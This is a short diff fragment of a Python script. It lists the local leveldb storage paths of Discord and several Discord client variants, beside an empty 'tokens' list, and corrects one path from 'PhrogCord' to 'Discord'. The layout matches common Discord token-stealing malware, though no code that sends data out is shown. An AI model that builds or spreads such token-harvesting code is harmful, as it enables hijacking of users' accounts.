@@ -7,7 +7,7 @@ local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 tokens = []
 paths = {
-    "Discord": f"{roaming}/PhrogCord/Local Storage/leveldb",
+    "Discord": f"{roaming}/Discord/Local Storage/leveldb",
     "Discord Canary": f"{roaming}/DiscordCanary/Local Storage/leveldb",
     "Discord PTB": f"{roaming}/DiscordPTB/Local Storage/leveldb",
     "LigthCord": f"{roaming}/Lightcord/Local Storage/leveldb",
